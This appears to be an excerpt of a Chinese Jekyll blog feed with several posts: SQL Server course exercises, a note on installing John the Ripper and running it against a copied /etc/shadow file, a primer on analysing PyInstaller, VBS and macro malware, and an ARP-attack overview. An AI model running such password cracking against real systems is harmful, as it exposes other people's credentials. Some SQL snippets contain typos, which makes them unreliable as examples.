&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;SELECT SC.CNO,AVG(GARDE) 
 FROM SC JOIN C ON 
 SC.CNO = C.CNO and cddept = 'CS'
 GROUP BY SC.CNO
 GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;统计每门课程的学生选修人数（超过１０人的课程才统计）按人数降序排列，若人数相同，按课程号升序排列&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
SELECT CNO,COUNT(SNO)
FROM SC
GROUP BY CNO HAVING COUNT(*)&amp;gt;10
ORDER BY 2 DESC,1
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;查询姓＂王＂的所有学生的姓名和年龄&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt; USE JXGL
GO
SELECT SNAME,AGE
FROM S
WHERE SNAME LIKE '王%'
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;在ＳＣ中查询成绩为空值的学生学号和课程号&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt; USE JXGL
GO
SELECT SNO,CNO
FROM SC
WHERE GRADE IS NULL
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;查询１９９７年９月１日前出生的信息学院和数学学院女生的信息&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;select * from S join SC on S.SNO = SC.SNO join C on SC.CNO = C.CNO
where brith &amp;lt; '19970901' and (CDEPT = &quot;信息学院&quot; orCDEPT = &quot;数学学院&quot; )
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;在基本表Ｓ中检索每一门课程成绩都大于８０分的学生学号，姓名，性别，并存储在一个&lt;code&gt;已经存在&lt;/code&gt;的基本表ＳＴＵＤＥＮＴ（ＳＮＯ，ＳＮＡＭＥ，ＳＥＸ）&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;建表：
USE JXGL
GO
CREATE TABLE STUDENT(SNO CHAR(9) NOT NULL,
SNAME CHAR(8) NOT NULL,
SEX CHAR(2))
GO
查询结果插入：
USE JXGL
GO
INSERT INTO STUDENT(SNO,SNAME,SEX)
SELECT SNO,SNAME,SEX
FROM S
WHERE SNO IN (SELECT SNO
              FROM SC
              GROUP BY SNO HAVING MIN(GRADE)&amp;gt;80)
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;在ＳＣ中删除无成绩的学科元组&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
DELETE FROM SC
        WHERE GRADE IS NULL
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;把＂张成民＂同学在ＳＣ中的选课记录全部删除&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
DELETE 
        FROM SC
        WHERE SNO IN(SELECT SNO 
                FROM S 
                WHERE SNAME='张成民')
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;把选修“高等数学”课程中不及格的成绩全部改为空值&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
UPDATE SC
          SET GRADE=NULL
          WHERE GRADE&amp;lt;60 AND CNO IN(SELECT CNO
                                FROM C
                                WHERE CNAME='高等数学')

GO
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;把低于总平均成绩的女同学成绩提高５％&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
UPDATE SC
        SET GRADE=GRADE*1.05
        WHERE SNO IN(SELECT SNO
                FROM S 
                WHERE SEX='F')
                    AND GRADE&amp;lt;(SELECT AVG(GRADE)
                                 FROM SC)
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;存储过程&quot;&gt;存储过程&lt;/h1&gt;

&lt;p&gt;在教学管理数据库中，创建一个名为ＳＴＵ＿ＡＧＥ的存储过程，根据输入的学号，输出该学生的出生年份&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
CREATE PROCEDURE STU_AGE
      @S_NAME CHAR(8)
AS
      SELECT YEAR(GETDATE()-AGE) AS 'YEAR'
      FROM S 
      WHERE SNAME=@S_NAME
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;创建ＧＲＡＤＥ＿ＩＮＦＯ存储过程，功能是查询某门课程所有学生成绩，显示字段ＣＮＡＭＥ，ＳＮＯ，ＳＮＡＭＥ，ＧＲＡＤＥ&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
CREATE PROCEDURE GRADE_INFO
        @C_NAME VARCHAR(50)
AS
        SELECT CNAME,SC.SNO,SNAME,GRADE
        FROM S JOIN SC ON S.SNO=SC.SNO JOIN C ON SC.CNO=C.CNO AND CNAME=@C_NAME     
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;触发器&quot;&gt;触发器&lt;/h1&gt;

&lt;p&gt;创建触发器ＴＲ＿Ｃ＿ＩＮＳＥＲＴ，在Ｃ表中插入一条新元组，触发器触发，给出＂你插入了一门新课程!＂信息&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;CREATE TRIGGER TR_C_INSERT
ON C
       FOR
          INSERT
AS 
        PRINT '你插入了一门新的课程！'
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ＡＦＴＥＲ触发器，在ＳＣ表创建一个插入，更新类型的触发器ＴＲ＿ＧＲＡＤＥ＿ＣＨＥＣＫ，当ＧＲＡＤＥ字段中插入或修改成绩后触发，检查是否在０～１００之间&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;CREATE TRIGGER TR_GRADE_CHECK
ON SC
       FOR
          INSERT，UPDATE
AS 
  DECLARE @SC_grede tinyint
SELECT @SC_grade=SC.grade
FROM SC
IF (@SC_grade NOT BETWEEN 0 AND 100)
          PRINT '你插入的成绩不在0~100之间！'
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;用户自定义函数&quot;&gt;用户自定义函数&lt;/h1&gt;

&lt;p&gt;创建函数Ｃ＿ＭＡＸ，根据输入的课程名称，输出该门课程最高分数的同学学号&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
CREATE FUNCTION C_MAX
(@C_NAME CHAR(8))
      RETURNS REAL
     AS
BEGIN
          DECLARE @S_MAX REAL
          SELECT @S_MAX=MAX(GRADE) 
          FROM SC JOIN C ON SC.CNO=C.CNO AND C.CNAME=@C_NAME
          RETURN @S_MAX
END
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;创建ＳＮＯ＿ＩＮＦＯ函数，根据输入的课程名称，输出选修该门课程的学生学号，姓名，性别，系部，成绩&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE JXGL
GO
CREATE FUNCTION SNO_INFO
(@C_NAME CHAR(8))
 RETURNS TABLE
     AS
     RETURN(SELECT S.SNO,SNAME,SEX,SDEPT,GRADE
          FROM S JOIN SC ON S.SNO=SC.SNO JOIN C ON SC.CNO=C.CNO AND C.CNAME=@C_NAME)          
GO
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;混合验证方式&quot;&gt;混合验证方式&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;ＳＱＬ　ｓｅｒｖｅｒ&lt;/li&gt;
  &lt;li&gt;Ｗｉｎｄｏｗｓ&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;备份&quot;&gt;备份&lt;/h1&gt;

&lt;h2 id=&quot;完整备份&quot;&gt;完整备份&lt;/h2&gt;

&lt;p&gt;备份整个数据库所有内容,包括事务日志,在还原时,只需还原一个备份文件即可&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;USE master
GO
BACKUP DATABASE JXGL
TO DISK='D:\...path...\JXGL_BACKUP.bak'
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;差异备份&quot;&gt;差异备份&lt;/h2&gt;

&lt;p&gt;是对完整备份的补充,只是备份上次完整备份后更改的数据,量更小,速度更快&lt;/p&gt;

&lt;p&gt;数据还原时,需要先还原前一次完整备份数据,然后再还原差异备份的数据&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;BACKUP DATABASE &amp;lt;数据库名字&amp;gt;
TO DISK|TAPE=&amp;lt;物理文件名&amp;gt;
WITH DIFFERENTIAL
;--------例子
USE master
GO
BACKUP DATABASE JAGL
TO DISK='D:\...\FIRSTBACKUP'
WITH DIFFERENTIAL,
NOINIT
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;事务日志备份&quot;&gt;事务日志备份&lt;/h2&gt;

&lt;p&gt;事务备份只备份事务日志中的内容.事务日志记录了上一次完整备份或事务日志备份后数据库所有变动过程,所以在事务备份前,一定要先做完整备份.&lt;/p&gt;

&lt;p&gt;还原时,除了要还原上一次完整备份内容,还要依次还原每个事务日志备份,而不是最后一个事务日志备份&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;BACKUP LOG &amp;lt;数据库名&amp;gt;
TO DISK|TYPE = &amp;lt;NAME&amp;gt;
WITH DIFFERENTIAL
;----------------
;例子:事务日志备份,且追加到现有备份firstbackup
USE master
GO
BACKUP LOG JXGL
TO DISK='....\firstbackup'
WITH NOINIT
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;例题&lt;/p&gt;

  &lt;p&gt;备份JXGL和还原JXGL全过程&lt;/p&gt;

  &lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;;创建my_disk备份设备
USE master
GO
EXEC  sp_addumpdevice 'disk','my_disk','D:\....\Dump.bak'
&lt;/code&gt;&lt;/pre&gt;

  &lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;;备份
USE master
GO
BACKUP DATABASE JXGL
TO DISK='d:\...\Dump2.bak'
BACKUP LOG JXGL TO DISK='D:\...\Dump2.bak' WITH NORECOVERY
&lt;/code&gt;&lt;/pre&gt;

  &lt;pre&gt;&lt;code class=&quot;language-mssql&quot;&gt;;还原

USE master
GO
RESTORE DATABASE JXGL
FROM DISK='D:\....\Dump2.bak'
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;还原模式&quot;&gt;还原模式&lt;/h1&gt;

&lt;h2 id=&quot;完全还原&quot;&gt;完全还原&lt;/h2&gt;

&lt;p&gt;选择完全还原常使用如下备份策略:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;完整数据库备份&lt;/li&gt;
  &lt;li&gt;差异备份&lt;/li&gt;
  &lt;li&gt;事务日志备份&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;大容量日志还原&quot;&gt;大容量日志还原&lt;/h2&gt;

&lt;p&gt;是对完全还原模式的补充,也就是对大容量操作进行最小日志记录&lt;/p&gt;

&lt;h2 id=&quot;简单还原&quot;&gt;简单还原&lt;/h2&gt;

&lt;p&gt;指在还原时,仅仅使用了数据库完整备份或差异备份,而不涉及事务日志备份&lt;/p&gt;</content><author><name></name></author><summary type="html">[toc]</summary></entry><entry><title type="html">John_the_Ripper</title><link href="http://localhost:4000/_posts/2020-06-22-John_the_Ripper/" rel="alternate" type="text/html" title="John_the_Ripper" /><published>2020-06-22T00:00:00+08:00</published><updated>2020-06-22T00:00:00+08:00</updated><id>http://localhost:4000/_posts/John_the_Ripper</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-22-John_the_Ripper/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;安装&quot;&gt;安装&lt;/h1&gt;

&lt;p&gt;官方网站：http://www.openwall.com/john/&lt;/p&gt;

&lt;p&gt;下载：wget http://www.openwall.com/john/j/john-1.8.0.tar.gz&lt;/p&gt;

&lt;p&gt;解压：tar -xvf john-1.8.0.tar.gz&lt;/p&gt;

&lt;p&gt;进入src目录：&lt;/p&gt;

&lt;p&gt;cd john-1.8.0 &amp;amp;&amp;amp; cd src&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;make
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;根据自己系统版本选择,一般为如下&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;make clean linux-x86-64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;编译成功会在run目录下生成john可执行文件&lt;/p&gt;

&lt;h1 id=&quot;破解&quot;&gt;破解&lt;/h1&gt;

&lt;p&gt;把想破解的/etc/shadow放在shadow.txt文件夹下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./john shadow.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;John the Ripper的默认密码字典为run目录下的password.lst&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">恶意脚本分析</title><link href="http://localhost:4000/_posts/2020-06-20-%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/" rel="alternate" type="text/html" title="恶意脚本分析" /><published>2020-06-20T00:00:00+08:00</published><updated>2020-06-20T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-20-%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;python样本分析&quot;&gt;python样本分析&lt;/h1&gt;

&lt;h2 id=&quot;如何打包&quot;&gt;如何打包&lt;/h2&gt;

&lt;p&gt;pyinstaller&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;usage: pyinstaller [-h] [-v] [-D] [-F] [--specpath DIR] [-n NAME]
                   [--add-data &amp;lt;SRC;DEST or SRC:DEST&amp;gt;]
                   [--add-binary &amp;lt;SRC;DEST or SRC:DEST&amp;gt;] [-p DIR]
                   [--hidden-import MODULENAME]
                   [--additional-hooks-dir HOOKSPATH]
                   [--runtime-hook RUNTIME_HOOKS] [--exclude-module EXCLUDES]
                   [--key KEY] [-d {all,imports,bootloader,noarchive}] [-s]
                   [--noupx] [--upx-exclude FILE] [-c] [-w]
                   [-i &amp;lt;FILE.ico or FILE.exe,ID or FILE.icns&amp;gt;]
                   [--version-file FILE] [-m &amp;lt;FILE or XML&amp;gt;] [-r RESOURCE]
                   [--uac-admin] [--uac-uiaccess] [--win-private-assemblies]
                   [--win-no-prefer-redirects]
                   [--osx-bundle-identifier BUNDLE_IDENTIFIER]
                   [--runtime-tmpdir PATH] [--bootloader-ignore-signals]
                   [--distpath DIR] [--workpath WORKPATH] [-y]
                   [--upx-dir UPX_DIR] [-a] [--clean] [--log-level LEVEL]
                   scriptname [scriptname ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;–onefile 将结果打包成一个可执行文件&lt;/li&gt;
  &lt;li&gt;–onedir 将所有结果打包到一个文件夹中，该文件夹包括一个可执行文件和可执行文件执行时需要的依赖文件（默认）&lt;/li&gt;
  &lt;li&gt;–paths=DIR 设置导入路径&lt;/li&gt;
  &lt;li&gt;–distpath=DIR 设置将打包的结果文件放置的路径&lt;/li&gt;
  &lt;li&gt;–specpath=DIR 设置将spec文件放置的路径&lt;/li&gt;
  &lt;li&gt;–windowed 使用windows子系统执行，不会打开命令行（只对windows有效）&lt;/li&gt;
  &lt;li&gt;–nowindowed 使用控制台子系统执行（默认）（只对windows有效）&lt;/li&gt;
  &lt;li&gt;–icon=&lt;FILE.ICO&gt; 将file.ico添加为可执行文件的资源(只对windows有效）&lt;/FILE.ICO&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;运行如下命令&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pyinstaller --onefile --nowindowed filename.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在当前文件下生成了build文件夹、dist文件夹和.spec文件&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;.spec文件是配置规范文件&lt;/li&gt;
  &lt;li&gt;build里存放将被打包的文件 exe文件就存放在dist文件夹下&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;__pycache__&lt;/code&gt;是pyc文件&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;pyc文件&quot;&gt;pyc文件&lt;/h3&gt;

&lt;p&gt;pyc是一种二进制文件，是由py文件经过编译后，生成的文件，是一种byte code，py文件变成pyc文件后，加载的速度有所提高，而且pyc是一种跨平台的字节码，是由python的虚拟机来执行的，这个是类似于JAVA或者.NET的虚拟机的概念。pyc的内容，是跟python的版本相关的，不同版本编译后的pyc文件是不同的，2.5编译的pyc文件，2.4版本的 python是无法执行的。&lt;/p&gt;

&lt;h3 id=&quot;pyo文件&quot;&gt;pyo文件&lt;/h3&gt;

&lt;p&gt;pyo是优化编译后的程序 python -O 源文件即可将源程序编译为pyo文件&lt;/p&gt;

&lt;h3 id=&quot;pyd文件&quot;&gt;pyd文件&lt;/h3&gt;

&lt;p&gt;pyd是python的动态链接库。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;为什么需要pyc文件&lt;/p&gt;

  &lt;p&gt;因为py文件是可以直接看到源码的，如果你是开发商业软件的话，不可能把源码也泄漏出去吧？所以就需要编译为pyc后，再发布出去。当然，pyc文件也是可以反编译的，不同版本编译后的pyc文件是不同的，根据python源码中提供的opcode，可以根据pyc文件反编译出  py文件源码，网上可以找到一个反编译python2.3版本的pyc文件的工具，不过该工具从python2.4开始就要收费了，如果需要反编译出新版本的pyc文件的话，就需要自己动手了,不过你可以自己修改python的源代码中的opcode文件，重新编译 python，从而防止不法分子的破解&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;关于打包的exe位数&quot;&gt;关于打包的exe位数&lt;/h3&gt;

&lt;p&gt;如果你想打包为32位的程序，那么请在32位的windows环境下进行打包。如果你想打包为64位的程序，那么请在64位的windows环境下进行打包。&lt;/p&gt;

&lt;h2 id=&quot;特征&quot;&gt;特征&lt;/h2&gt;

&lt;h3 id=&quot;图标特征&quot;&gt;图标特征&lt;/h3&gt;

&lt;p&gt;用pyintaller打包的exe，在没有指定图标的情况下默认的图标都是这一个，包括驱动人生的那几个木马，都是这样的图标，辨识度可以说是很高了。但是这个特征是可以被避免的，仅供参考&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pyicon.PNG&quot; alt=&quot;pyicon&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;字符串特征&quot;&gt;字符串特征&lt;/h3&gt;

&lt;p&gt;你会看到__main__和__file__以及一堆以py开头的函数。明明只写了一个hello world，为什么会有这么多字符串呢？这是因为python是个解释型语言，pyinstaller打包的时候实际上是将python的解释器和py文件一起打包成了一个exe。所以这个字符串特征几乎是不可避免的&lt;/p&gt;

&lt;h3 id=&quot;编译器特征&quot;&gt;编译器特征&lt;/h3&gt;

&lt;p&gt;使用&lt;strong&gt;Detect It Easy&lt;/strong&gt;这个软件查看,类似Linux &lt;strong&gt;strace&lt;/strong&gt;命令&lt;/p&gt;

&lt;p&gt;可以看到hello.exe的编译器为VS14.0，这是因为python是基于VS14版本的，这也可以作为一个辨识的特征&lt;/p&gt;

&lt;h3 id=&quot;反编译&quot;&gt;反编译&lt;/h3&gt;

&lt;p&gt;这需要两个步骤，首先由exe获取pyc文件，再由pyc获取py文件&lt;/p&gt;

&lt;p&gt;反编译python生成的exe需要用到pyinstaller库里的archive_viewer.py脚本。archive_viewer.py一共有四个可用命令：&lt;/p&gt;

&lt;p&gt;U: go Up one level
O &lt;name&gt;: open embedded archive name
X &lt;name&gt;: extract name
Q: quit&lt;/name&gt;&lt;/name&gt;&lt;/p&gt;

&lt;h4 id=&quot;由exe获取pyc&quot;&gt;由exe获取pyc&lt;/h4&gt;

&lt;p&gt;首先找到archive_viewer.py这个脚本的路径&lt;/p&gt;

&lt;p&gt;运行&lt;code&gt;python archive_viewer.py C:\hello.exe&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;提取主程序的pyc文件&quot;&gt;提取主程序的pyc文件&lt;/h4&gt;

&lt;p&gt;&lt;code&gt;x hello&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;由于用pyinstaller打包后，pyc文件的前8个字节会被抹掉，所以最后要自己添加回去。前四个字节为python编译的版本，后四个字节为时间戳，时间戳可以任意，编译器版本python2.7 为03 f3 0d 0a，python3.4 为ee 0c 0d 0a&lt;/p&gt;

&lt;h4 id=&quot;由pyc获取py&quot;&gt;由pyc获取py&lt;/h4&gt;

&lt;p&gt;最后使用&lt;code&gt;easy python decompiler&lt;/code&gt;这个软件从pyc文件得到py文件，直接将pyc文件拖拽进程序&lt;/p&gt;

&lt;h2 id=&quot;python代码混淆的解决方案&quot;&gt;python代码混淆的解决方案&lt;/h2&gt;

&lt;p&gt;python代码的混淆相对会比较简单，只是单纯利用宏替换的原理修改变量和函数名，这个网站是目前用的最多的python代码混淆工具：http://pyob.oxyry.com/&lt;/p&gt;

&lt;h2 id=&quot;去除python代码混淆&quot;&gt;去除python代码混淆&lt;/h2&gt;

&lt;p&gt;直接替换晦涩难懂的变量名&lt;/p&gt;

&lt;h1 id=&quot;vbs样本分析&quot;&gt;vbs样本分析&lt;/h1&gt;

&lt;h2 id=&quot;vbs病毒介绍&quot;&gt;vbs病毒介绍&lt;/h2&gt;

&lt;p&gt;VBS病毒是用VB Script编写的，它利用Windows系统的开放性，通过调用现有的Windows对象、组件，程序可以直接控制文件、系统、注册表，功能非常强大。VBS脚本病毒通常的传播方式有：通过Email附件、IRC聊天通道、局域网共享传播，还可以通过感染htm、jsp、php 、asp等网页文件传播，传播范围比较广泛，它的变种多，迷惑性很强，所以电脑如果中了这种病毒就会很麻烦。
vbs类的病毒如何动态调试是个很大的问题，微软的地表最强IDE Visual Studio就能做到这一点。&lt;/p&gt;

&lt;h2 id=&quot;用vs调试vbs脚本&quot;&gt;用VS调试vbs脚本&lt;/h2&gt;

&lt;p&gt;首先用管理员方式启动VS，接着选择调试-&amp;gt;选项，把脚本前面的勾给打上&lt;/p&gt;

&lt;h2 id=&quot;启动调试器&quot;&gt;启动调试器&lt;/h2&gt;

&lt;p&gt;命令行输入&lt;code&gt;wscript /X 要调试vbs脚本的路径&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;WScript.exe命令说明&lt;/p&gt;

&lt;p&gt;WScript.exe [vbs文件全路径] [参数1] [参数2] […] [参数n] //D //
参数说明：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;D 打开调试程序&lt;/li&gt;
  &lt;li&gt;X 在调试程序中启动该程序&lt;/li&gt;
  &lt;li&gt;? 可以使用该参数查看WScript.exe的所有参数及说明&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;然后你就可以开始用VS来调试vbs脚本了，可以看堆栈 看内存，看局部变量&lt;/p&gt;

&lt;h2 id=&quot;vbs病毒混淆解决方案&quot;&gt;vbs病毒混淆解决方案&lt;/h2&gt;

&lt;p&gt;vbs病毒最严重的就是混淆了， 不管怎么混淆，大致都能用以下两种解决方案&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如果能直接打印或输出到文件则不需要关注语法，直接将结果打印&lt;/li&gt;
  &lt;li&gt;如果不能直接看到结果则根据函数及参数含义弄清混淆原理之后手动将混淆结果替换&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;宏病毒样本分析&quot;&gt;宏病毒样本分析&lt;/h1&gt;

&lt;h2 id=&quot;什么是宏&quot;&gt;什么是宏&lt;/h2&gt;

&lt;p&gt;宏（macro），就是软件设计者为了在使用软件工作时，避免一再的重复相同的动作而设计出来的一种工具。它利用简单的语法，把常用的动作写成宏，当再工作时，就可以直接利用事先写好的宏自动运行，去完成某项特定的任务，而不必再重复相同的动作。&lt;/p&gt;

&lt;h2 id=&quot;什么是宏病毒&quot;&gt;什么是宏病毒&lt;/h2&gt;

&lt;p&gt;宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。&lt;/p&gt;

&lt;h2 id=&quot;宏病毒的特性&quot;&gt;宏病毒的特性&lt;/h2&gt;

&lt;p&gt;宏病毒具有自动执行的特性，特别是含有AutoOpen的宏，一旦用户打开含有宏的文档，其中的宏就会被执行，而用户一无所知&lt;/p&gt;

&lt;h2 id=&quot;宏语言&quot;&gt;宏语言&lt;/h2&gt;

&lt;p&gt;宏语言即VISUAL BASIC FOR APPLICATION，简称VBA。VBA可以访问许多操作系统函数并支持文档打开时自动执行宏——这使得用这种语言写计算机病毒成为可能&lt;/p&gt;

&lt;h2 id=&quot;数据文件格式&quot;&gt;数据文件格式&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;.doc—一种可以存贮云的普通文档；.docx—一种不包含宏的普通文档；&lt;/li&gt;
  &lt;li&gt;.docm——一种包含宏或启用了宏的文档；&lt;/li&gt;
  &lt;li&gt;.dotx——一种不包含宏的模板；&lt;/li&gt;
  &lt;li&gt;.dotm———种包含宏或启用了宏的模板&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;常用的宏&quot;&gt;常用的宏&lt;/h2&gt;

&lt;h2&gt;&lt;img src=&quot;/img/hong.png&quot; alt=&quot;hong&quot; /&gt;&lt;/h2&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">ARP安全</title><link href="http://localhost:4000/_posts/2020-06-15-ARP%E5%AE%89%E5%85%A8/" rel="alternate" type="text/html" title="ARP安全" /><published>2020-06-15T00:00:00+08:00</published><updated>2020-06-15T00:00:00+08:00</updated><id>http://localhost:4000/_posts/ARP%E5%AE%89%E5%85%A8</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-15-ARP%E5%AE%89%E5%85%A8/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;arp协议&quot;&gt;ARP协议&lt;/h1&gt;

&lt;p&gt;ARP协议（&lt;code&gt;address resolution protocol&lt;/code&gt;）&lt;code&gt;地址解析协议&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;IP&lt;/code&gt; &lt;code&gt;--&amp;gt;&amp;gt;&lt;/code&gt;　&lt;code&gt;MAC&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;ARP协议的基本功能就是通过目标设备的IP地址，来查询目标设备的mac地址。&lt;/p&gt;

&lt;p&gt;在局域网的任意一台主机中，都有一个&lt;code&gt;ARP缓存表&lt;/code&gt;，里面保存本机已知的此局域网中各主机和路由器的IP地址和MAC地址的对照关系。ARP缓存表的&lt;code&gt;生命周期是有时限的&lt;/code&gt;（一般不超过20分钟）&lt;/p&gt;

&lt;h1 id=&quot;apr攻击发现&quot;&gt;APR攻击发现&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;上网明显变慢，或者突然掉线时&lt;/strong&gt;，我们可以用&lt;code&gt;arp -a&lt;/code&gt;命令来检查ARP表&lt;code&gt;arp -d&lt;/code&gt;删除ARP表&lt;/li&gt;
  &lt;li&gt;ARP防火墙类软件&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;攻击方式&quot;&gt;&lt;strong&gt;攻击方式&lt;/strong&gt;&lt;/h1&gt;

&lt;h2 id=&quot;简单的诈骗攻击&quot;&gt;&lt;strong&gt;简单的诈骗攻击&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;这是对比多见的攻击，经过发送伪造的ARP包来诈骗路由和方针主机，让方针主机认为这是一个合法的主机，便完成了诈骗，这种诈骗多发生在同一网段内，因为路由不会把本网段的包向外转发，当然完成不一样网段的攻击也有办法，便要经过ICMP协议来告诉路由器从头挑选路由&lt;/p&gt;

&lt;h2 id=&quot;根据arp的dos&quot;&gt;&lt;strong&gt;根据ARP的DOS&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;D.O.S又称拒绝服务攻击，当大量的衔接请求被发送到一台主机时，因为主机的处理才能有限，不能为正常用户提供服务，便呈现拒绝服务。这个过程中假如运用ARP来躲藏自己，在被攻击主机的日志上就不会呈现真实的IP攻击，也不会影响到本机。&lt;/p&gt;

&lt;h2 id=&quot;mac-flooding&quot;&gt;&lt;strong&gt;MAC Flooding&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;这是一个对比风险的攻击，能够溢出交流机的ARP表，使全部网络不能正常通讯。&lt;/p&gt;

&lt;h1 id=&quot;arp攻击的防护&quot;&gt;&lt;strong&gt;arp攻击的防护&lt;/strong&gt;&lt;/h1&gt;

